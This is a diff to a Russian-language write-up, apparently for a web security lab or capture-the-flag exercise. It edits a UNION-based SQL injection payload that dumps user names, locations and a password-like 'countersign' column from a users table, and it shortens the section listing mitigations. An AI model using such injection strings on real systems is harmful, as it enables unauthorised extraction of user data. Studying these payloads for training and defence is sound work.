@@ -132,7 +132,7 @@
 
 	Что бы посмотреть все данные пользователей:
 	```
-	1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
+	1 OR 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
 	```
 	<img width="922" alt="Screen Shot 2022-11-12 at 16 59 20" src="https://user-images.githubusercontent.com/84193980/201477846-0f12c5e8-c33f-41dc-a94e-1755141cab9d.png">
 
@@ -158,10 +158,7 @@ lower all the char: fortytwo
 [sh256](https://crypt-online.ru/crypts/sha256/): 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 ### Как исправить:
-- использование подготовленных операторов (с параметризованными запросами)
-- использование хранимых процедур
-- проверка ввода белого списка
-- экранирование всех введенных пользователем данных
+- предварительно обработать параметры SQL-запроса, в том числе привести к целочисленному типу, экранировать значения, подготовленные значения (https://htmlacademy.ru/tutorial/php/sql-injections)
 
 ----
 
